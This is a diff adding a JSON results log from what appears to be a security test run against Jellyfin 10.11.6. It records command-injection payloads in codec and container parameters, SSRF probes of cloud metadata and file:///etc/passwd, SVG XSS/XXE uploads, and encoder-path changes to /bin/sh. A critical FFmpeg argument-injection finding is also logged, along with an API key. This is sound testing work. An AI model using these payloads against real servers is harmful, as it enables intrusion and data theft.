@@ -1,0 +1,359 @@
+{
+  "script": "phase2_ffmpeg_injection",
+  "phase": "phase2",
+  "target": "Jellyfin 10.11.6",
+  "start_time": "2026-03-02T18:38:12.459716",
+  "end_time": "2026-03-02T18:38:25.730618",
+  "summary": {
+    "total_tests": 36,
+    "findings": 2,
+    "anomalies": 0
+  },
+  "tests": [
+    {
+      "id": "CODEC-VideoCodec-Pipe-delimited codec",
+      "description": "Codec injection: Pipe-delimited codec",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=h264|h265",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:12.591782"
+    },
+    {
+      "id": "CODEC-VideoCodec-Comma-delimited code",
+      "description": "Codec injection: Comma-delimited codec",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=h264,h265",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:12.899936"
+    },
+    {
+      "id": "CODEC-AudioCodec-Pipe-delimited audio",
+      "description": "Codec injection: Pipe-delimited audio codec",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?AudioCodec=aac|mp3",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:13.208090"
+    },
+    {
+      "id": "CODEC-Container-Pipe-delimited conta",
+      "description": "Codec injection: Pipe-delimited container",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?Container=mp4|mkv",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:13.512242"
+    },
+    {
+      "id": "CODEC-VideoCodec-Codec exceeding 40 c",
+      "description": "Codec injection: Codec exceeding 40 char limit",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+      "response": "HTTP 400: {\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"One or more validation errors occurred.\",\"status\":400,\"errors\":{\"videoCodec\":[\"The field videoCodec must match the regular express",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:13.816394"
+    },
+    {
+      "id": "CODEC-VideoCodec-Semicolon injection ",
+      "description": "Codec injection: Semicolon injection attempt",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=h264;id",
+      "response": "HTTP 400: {\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"One or more validation errors occurred.\",\"status\":400,\"errors\":{\"videoCodec\":[\"The field videoCodec must match the regular express",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:14.120546"
+    },
+    {
+      "id": "CODEC-VideoCodec-Space injection atte",
+      "description": "Codec injection: Space injection attempt",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=h264 -v",
+      "response": "HTTP 400: {\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"One or more validation errors occurred.\",\"status\":400,\"errors\":{\"videoCodec\":[\"The field videoCodec must match the regular express",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:14.424698"
+    },
+    {
+      "id": "CODEC-VideoCodec-Newline injection at",
+      "description": "Codec injection: Newline injection attempt",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?VideoCodec=h264\n-v",
+      "response": "HTTP 400: {\"type\":\"https://tools.ietf.org/html/rfc9110#section-15.5.1\",\"title\":\"One or more validation errors occurred.\",\"status\":400,\"errors\":{\"videoCodec\":[\"The field videoCodec must match the regular express",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:14.728850"
+    },
+    {
+      "id": "CODEC-Container-Shell command inject",
+      "description": "Codec injection: Shell command injection in container",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?Container=mp4$(id)",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:15.029000"
+    },
+    {
+      "id": "CODEC-Container-Backtick injection i",
+      "description": "Codec injection: Backtick injection in container",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?Container=mp4`id`",
+      "response": "HTTP 200: stream data",
+      "result": "ANOMALOUS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:15.337154"
+    },
+    {
+      "id": "PLAYBACK-Normal playback info requ",
+      "description": "PlaybackInfo: Normal playback info request",
+      "request": "POST /Items/6aa1c530685324775a62c31a44853a81/PlaybackInfo",
+      "response": "HTTP 200: {\"MediaSources\":[{\"Protocol\":\"File\",\"Id\":\"6aa1c530685324775a62c31a44853a81\",\"Path\":\"/media/movies/Test_Movie_2026.mp4\",\"Type\":\"Default\",\"Container\":\"mp4\",\"Size\":140270,\"Name\":\"Test_Movie_2026\",\"IsRemote\":false,\"ETag\":\"54d9195a8f90fc6bd62ea2e3a78b8c0a\",\"RunTimeTicks\":100000000,\"ReadAtNativeFramerate\"",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:15.717344"
+    },
+    {
+      "id": "PLAYBACK-Injection in TranscodingP",
+      "description": "PlaybackInfo: Injection in TranscodingProfile container",
+      "request": "POST /Items/6aa1c530685324775a62c31a44853a81/PlaybackInfo",
+      "response": "HTTP 200: {\"MediaSources\":[{\"Protocol\":\"File\",\"Id\":\"6aa1c530685324775a62c31a44853a81\",\"Path\":\"/media/movies/Test_Movie_2026.mp4\",\"Type\":\"Default\",\"Container\":\"mov,mp4,m4a,3gp,3g2,mj2\",\"Size\":140270,\"Name\":\"Test_Movie_2026\",\"IsRemote\":false,\"ETag\":\"54d9195a8f90fc6bd62ea2e3a78b8c0a\",\"RunTimeTicks\":100000000,\"Re",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:16.033502"
+    },
+    {
+      "id": "PLAYBACK-Injection in DirectPlayPr",
+      "description": "PlaybackInfo: Injection in DirectPlayProfile VideoCodec",
+      "request": "POST /Items/6aa1c530685324775a62c31a44853a81/PlaybackInfo",
+      "response": "HTTP 200: {\"MediaSources\":[{\"Protocol\":\"File\",\"Id\":\"6aa1c530685324775a62c31a44853a81\",\"Path\":\"/media/movies/Test_Movie_2026.mp4\",\"Type\":\"Default\",\"Container\":\"mp4\",\"Size\":140270,\"Name\":\"Test_Movie_2026\",\"IsRemote\":false,\"ETag\":\"54d9195a8f90fc6bd62ea2e3a78b8c0a\",\"RunTimeTicks\":100000000,\"ReadAtNativeFramerate\"",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:16.337654"
+    },
+    {
+      "id": "PLAYBACK-SubtitleProfile with path",
+      "description": "PlaybackInfo: SubtitleProfile with path injection",
+      "request": "POST /Items/6aa1c530685324775a62c31a44853a81/PlaybackInfo",
+      "response": "HTTP 200: {\"MediaSources\":[{\"Protocol\":\"File\",\"Id\":\"6aa1c530685324775a62c31a44853a81\",\"Path\":\"/media/movies/Test_Movie_2026.mp4\",\"Type\":\"Default\",\"Container\":\"mp4\",\"Size\":140270,\"Name\":\"Test_Movie_2026\",\"IsRemote\":false,\"ETag\":\"54d9195a8f90fc6bd62ea2e3a78b8c0a\",\"RunTimeTicks\":100000000,\"ReadAtNativeFramerate\"",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:16.649810"
+    },
+    {
+      "id": "TRANSCODE-HLS",
+      "description": "HLS transcoding request",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/master.m3u8",
+      "response": "HTTP 200: #EXTM3U\n#EXT-X-STREAM-INF:BANDWIDTH=128000,AVERAGE-BANDWIDTH=128000,VIDEO-RANGE=SDR,CODECS=\"avc1.42400D,mp4a.40.2\",RESOLUTION=320x240,FRAME-RATE=24\nmain.m3u8?static=false&MediaSourceId=6aa1c5306853247",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:16.985978"
+    },
+    {
+      "id": "SSRF-localhost_api",
+      "description": "SSRF test: localhost_api",
+      "request": "GET /Images/Remote?imageUrl=http://127.0.0.1:8096/System/Info/Public",
+      "response": "Unauth: 404, Auth: 404",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:17.994482"
+    },
+    {
+      "id": "SSRF-cloud_metadata",
+      "description": "SSRF test: cloud_metadata",
+      "request": "GET /Images/Remote?imageUrl=http://[REDACTED-IP]/latest/meta-data/",
+      "response": "Unauth: 404, Auth: 404",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:18.298634"
+    },
+    {
+      "id": "SSRF-internal_docker",
+      "description": "SSRF test: internal_docker",
+      "request": "GET /Images/Remote?imageUrl=http://[REDACTED-INTERNAL-IP]:8096/System/Info/Public",
+      "response": "Unauth: 404, Auth: 404",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:18.602786"
+    },
+    {
+      "id": "SSRF-file_scheme",
+      "description": "SSRF test: file_scheme",
+      "request": "GET /Images/Remote?imageUrl=file:///etc/passwd",
+      "response": "Unauth: 404, Auth: 404",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:18.906938"
+    },
+    {
+      "id": "SSRF-callback_test",
+      "description": "SSRF test: callback_test",
+      "request": "GET /Images/Remote?imageUrl=http://127.0.0.1:8096/Branding/Css",
+      "response": "Unauth: 404, Auth: 404",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:19.211090"
+    },
+    {
+      "id": "UNAUTH-Users-Public",
+      "description": "Unauth access: Public user list",
+      "request": "GET /Users/Public",
+      "response": "HTTP 200: 2 bytes, application/json; charset=utf-8",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:21.944456"
+    },
+    {
+      "id": "UNAUTH-Branding-Configuration",
+      "description": "Unauth access: Branding config",
+      "request": "GET /Branding/Configuration",
+      "response": "HTTP 200: 29 bytes, application/json; charset=utf-8",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:22.148410"
+    },
+    {
+      "id": "UNAUTH-Branding-Splashscreen",
+      "description": "Unauth access: Splash screen image",
+      "request": "GET /Branding/Splashscreen",
+      "response": "HTTP 404: 162 bytes, application/json; charset=utf-8",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:22.360304"
+    },
+    {
+      "id": "UNAUTH-QuickConnect-Enabled",
+      "description": "Unauth access: Quick Connect status",
+      "request": "GET /QuickConnect/Enabled",
+      "response": "HTTP 200: 4 bytes, application/json; charset=utf-8",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:22.572198"
+    },
+    {
+      "id": "UNAUTH-web-ConfigurationPage",
+      "description": "Unauth access: Configuration page",
+      "request": "GET /web/ConfigurationPage",
+      "response": "HTTP 404: 162 bytes, application/json; charset=utf-8",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:22.784092"
+    },
+    {
+      "id": "UNAUTH-Users-ForgotPassword",
+      "description": "Unauth access: Password reset",
+      "request": "POST /Users/ForgotPassword",
+      "response": "HTTP 400: 445 bytes, application/json; charset=utf-8",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:22.995986"
+    },
+    {
+      "id": "UNAUTH-Items-6aa1c530685324775a6",
+      "description": "Unauth access: Item image (no auth)",
+      "request": "GET /Items/6aa1c530685324775a62c31a44853a81/Images/Primary",
+      "response": "HTTP 200: 8679 bytes, image/jpeg",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:23.223872"
+    },
+    {
+      "id": "UNAUTH-Videos-6aa1c530685324775a",
+      "description": "Unauth access: Static video stream (no auth)",
+      "request": "GET /Videos/6aa1c530685324775a62c31a44853a81/stream.mp4?static=t",
+      "response": "HTTP 200: 140270 bytes, video/mp4",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:23.431768"
+    },
+    {
+      "id": "UNAUTH-Audio-b645e920cc029b4c53d",
+      "description": "Unauth access: Static audio stream (no auth)",
+      "request": "GET /Audio/b645e920cc029b4c53db4fec504a58b3/stream.mp3?static=tr",
+      "response": "HTTP 200: 240552 bytes, audio/mpeg",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:23.667650"
+    },
+    {
+      "id": "SVG-basic_xss",
+      "description": "SVG upload: SVG with <script> tag",
+      "request": "POST /UserImage (Content-Type: image/svg+xml)",
+      "response": "HTTP 500: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:23.887540"
+    },
+    {
+      "id": "SVG-event_handler",
+      "description": "SVG upload: SVG with onload event handler",
+      "request": "POST /UserImage (Content-Type: image/svg+xml)",
+      "response": "HTTP 500: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:24.199384"
+    },
+    {
+      "id": "SVG-xxe_attempt",
+      "description": "SVG upload: SVG with XXE entity",
+      "request": "POST /UserImage (Content-Type: image/svg+xml)",
+      "response": "HTTP 500: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:24.503232"
+    },
+    {
+      "id": "SVG-external_image",
+      "description": "SVG upload: SVG with external image reference (SSRF)",
+      "request": "POST /UserImage (Content-Type: image/svg+xml)",
+      "response": "HTTP 500: Error processing request.",
+      "result": "PASS",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:24.811078"
+    },
+    {
+      "id": "ENCODER-PATH-/tmp/evil_ffmpe",
+      "description": "Encoder path set: /tmp/evil_ffmpeg",
+      "request": "POST /System/MediaEncoder/Path",
+      "response": "HTTP 204: ",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:25.118924"
+    },
+    {
+      "id": "ENCODER-PATH-/bin/sh",
+      "description": "Encoder path set: /bin/sh",
+      "request": "POST /System/MediaEncoder/Path",
+      "response": "HTTP 204: ",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:25.322822"
+    },
+    {
+      "id": "ENCODER-PATH-$(id)",
+      "description": "Encoder path set: $(id)",
+      "request": "POST /System/MediaEncoder/Path",
+      "response": "HTTP 204: ",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:38:25.526720"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FFMPEG-INJECT-Injection in Transco",
+      "severity": "CRITICAL",
+      "title": "FFmpeg injection via PlaybackInfo: Injection in TranscodingProfile container",
+      "details": "Payload appeared in TranscodingUrl: /videos/6aa1c530-6853-2477-5a62-c31a44853a81/master.m3u8?&DeviceId=cobalt-001&MediaSourceId=6aa1c530685324775a62c31a44853a81&VideoCodec=h264&AudioCodec=aac&AudioStreamIndex=1&VideoBitrate=7930746&AudioBitrate=69254&AudioSampleRate=44100&MaxFramerate=24&SegmentContainer=ts\" -f lavfi -i color&BreakOnNonKeyFrames=False&PlaySessionId=cf5a8df7886b4f96a14163461bee4c2e&ApiKey=5ebcce8543374bef9e601bf61eb3806a&RequireAvc=false&EnableAudioVbrEncoding=true&Tag=54d9195a8f90fc6bd62ea2e3a78b8c0a&h264-level=13&h264-videobitdepth=8&h264-profile=high4:4:4predictive&h264-audiochannels=1&aac-profile=lc&TranscodeReasons=DirectPlayError",
+      "evidence": "/videos/6aa1c530-6853-2477-5a62-c31a44853a81/master.m3u8?&DeviceId=cobalt-001&MediaSourceId=6aa1c530685324775a62c31a44853a81&VideoCodec=h264&AudioCodec=aac&AudioStreamIndex=1&VideoBitrate=7930746&AudioBitrate=69254&AudioSampleRate=44100&MaxFramerate=24&SegmentContainer=ts\" -f lavfi -i color&BreakOnNonKeyFrames=False&PlaySessionId=cf5a8df7886b4f96a14163461bee4c2e&ApiKey=5ebcce8543374bef9e601bf61eb3806a&RequireAvc=false&EnableAudioVbrEncoding=true&Tag=54d9195a8f90fc6bd62ea2e3a78b8c0a&h264-level=13&h264-videobitdepth=8&h264-profile=high4:4:4predictive&h264-audiochannels=1&aac-profile=lc&TranscodeReasons=DirectPlayError",
+      "remediation": "",
+      "timestamp": "2026-03-02T18:38:16.033502"
+    },
+    {
+      "id": "HEADERS-MISSING",
+      "severity": "MEDIUM",
+      "title": "Missing 9 security response headers",
+      "details": "Jellyfin does not set standard security headers. Missing: Content-Security-Policy, Cross-Origin-Embedder-Policy, Cross-Origin-Opener-Policy, Permissions-Policy, Referrer-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options, X-XSS-Protection. This affects all 66,757 internet-facing instances and reduces defense-in-depth against XSS, clickjacking, and MIME-type confusion.",
+      "evidence": "",
+      "remediation": "Add the following headers via ASP.NET Core middleware:\n  Content-Security-Policy: default-src 'self'; script-src 'self'\n  X-Content-Type-Options: nosniff\n  X-Frame-Options: DENY\n  Referrer-Policy: strict-origin-when-cross-origin\n  Permissions-Policy: camera=(), microphone=(), geolocation=()",
+      "timestamp": "2026-03-02T18:38:21.936452"
+    }
+  ],
+  "anomalies": []
+}
